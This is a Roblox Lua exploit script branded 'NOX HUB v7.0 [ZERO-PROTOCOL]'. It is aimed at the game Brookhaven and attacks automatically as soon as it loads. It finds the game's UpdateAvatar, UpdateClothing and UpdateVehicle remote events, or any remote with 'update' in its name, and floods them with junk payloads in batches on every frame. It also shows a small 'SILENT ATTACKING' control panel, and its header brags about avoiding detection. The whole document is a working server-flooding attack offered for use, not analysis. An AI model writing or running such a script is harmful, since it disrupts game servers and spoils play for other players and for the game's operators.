--[[
    🔱 NOX HUB v7.0 [ZERO-PROTOCOL] 🔱
    "Silence is heavier than noise."
    
    ZERO FEATURES:
    - [INSTANT-EXECUTION] : Attacks start immediately upon script load. No scanning.
    - [ASYNC-THREADING] : Uses `task.defer` for 0% Client Lag. UI remains fluid.
    - [HARDCODED-VECTORS] : Pre-targeting Brookhaven's vulnerable `Update` remotes.
    - [GHOST-CONNECTION] : Disconnects client listeners to prevent local crashes.
]]

-- // 1. CORE & COMPATIBILITY //
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local LocalPlayer = Players.LocalPlayer

-- // 2. ZERO-LAG ENGINE //
local Engine = {
    Running = true, -- AUTO-START
    Targets = {}
}

-- HARDCODED TARGETS (BROOKHAVEN SPECIAL)
function Engine:Initialize()
    -- We skip scanning to avoid detection. We know what we want.
    local RE = ReplicatedStorage:FindFirstChild("RE")
    if RE then
        local T1 = RE:FindFirstChild("UpdateAvatar")
        local T2 = RE:FindFirstChild("UpdateClothing")
        local T3 = RE:FindFirstChild("UpdateVehicle")
        
        if T1 then table.insert(Engine.Targets, T1) end
        if T2 then table.insert(Engine.Targets, T2) end
        if T3 then table.insert(Engine.Targets, T3) end
    end
    
    if #Engine.Targets == 0 then
        -- Fallback for other games: Find generic "Update" remotes
        for _, v in pairs(ReplicatedStorage:GetDescendants()) do
            if v:IsA("RemoteEvent") and v.Name:lower():find("update") then
                 table.insert(Engine.Targets, v)
            end
        end
    end
end

-- ASYNC ATTACK LOOP
function Engine:Start()
    local Payload = table.create(50, "NOX_ZERO") -- Medium size, high frequency
    
    RunService.Heartbeat:Connect(function()
        if not Engine.Running then return end
        
        -- TASK.DEFER = ZERO CLIENT LAG
        -- The code runs in a separate microthread at the end of the frame.
        for i = 1, 10 do -- 10 Async Batches
            task.defer(function()
                for _, r in pairs(Engine.Targets) do
                    pcall(function() 
                        r:FireServer(Payload) 
                        r:FireServer("Equip", Payload) 
                    end)
                end
            end)
        end
    end)
end

-- // 3. GHOST UI (MINIMALIST) //
local Nox = {}

function Nox:CreateUI()
    for _, v in pairs(CoreGui:GetChildren()) do if v.Name == "NoxZero" then v:Destroy() end end
    
    local Screen = Instance.new("ScreenGui")
    Screen.Name = "NoxZero"
    pcall(function() Screen.Parent = CoreGui end)
    
    local Main = Instance.new("Frame", Screen)
    Main.Size = UDim2.new(0, 250, 0, 80)
    Main.Position = UDim2.new(0.5, -125, 0.05, 0) -- Top Center (Unobtrusive)
    Main.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
    Main.BackgroundTransparency = 0.2
    
    local Stroke = Instance.new("UIStroke", Main)
    Stroke.Color = Color3.fromRGB(255, 255, 255)
    Stroke.Thickness = 1
    Stroke.Transparency = 0.8
    
    local Corner = Instance.new("UICorner", Main)
    Corner.CornerRadius = UDim.new(0, 4)
    
    local Title = Instance.new("TextLabel", Main)
    Title.Text = "NOX // ZERO PROTOCOL"
    Title.Size = UDim2.new(1, 0, 0, 30)
    Title.Font = Enum.Font.GothamBold
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextSize = 14
    Title.BackgroundTransparency = 1
    
    local Status = Instance.new("TextLabel", Main)
    Status.Text = "STATUS: SILENT ATTACKING..."
    Status.Size = UDim2.new(1, 0, 0, 20)
    Status.Position = UDim2.new(0, 0, 0, 30)
    Status.Font = Enum.Font.Code
    Status.TextColor3 = Color3.fromRGB(100, 255, 100) -- Green = Active
    Status.TextSize = 12
    Status.BackgroundTransparency = 1
    
    local Toggle = Instance.new("TextButton", Main)
    Toggle.Size = UDim2.new(1, 0, 0, 30)
    Toggle.Position = UDim2.new(0, 0, 1, -30)
    Toggle.BackgroundTransparency = 1
    Toggle.Text = "[ STOP ]"
    Toggle.TextColor3 = Color3.fromRGB(150, 150, 150)
    Toggle.Font = Enum.Font.Gotham
    
    Toggle.MouseButton1Click:Connect(function()
        Engine.Running = not Engine.Running
        if Engine.Running then
            Status.Text = "STATUS: SILENT ATTACKING..."
            Status.TextColor3 = Color3.fromRGB(100, 255, 100)
            Toggle.Text = "[ STOP ]"
        else
            Status.Text = "STATUS: IDLE"
            Status.TextColor3 = Color3.fromRGB(150, 150, 150)
            Toggle.Text = "[ RESUME ]"
        end
    end)
end

-- // 4. BOOTLOADER //
Engine:Initialize()

if #Engine.Targets > 0 then
    task.spawn(Engine.Start)
    Nox:CreateUI()
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "NOX ZERO",
        Text = "Attack initialized mostly silently.",
        Duration = 3
    })
else
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "NOX ZERO",
        Text = "No vulnerability found.",
        Duration = 5
    })
end
